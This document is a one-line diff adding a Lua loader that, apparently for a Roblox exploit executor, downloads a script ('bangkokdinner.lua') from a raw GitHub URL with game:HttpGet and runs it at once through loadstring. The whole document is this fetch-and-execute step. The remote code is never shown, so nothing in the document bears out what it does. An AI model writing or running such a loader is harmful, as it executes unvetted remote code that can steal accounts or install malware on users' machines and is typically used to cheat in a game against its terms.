@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Thun2552/Xmi/main/bangkokdinner.lua'))()
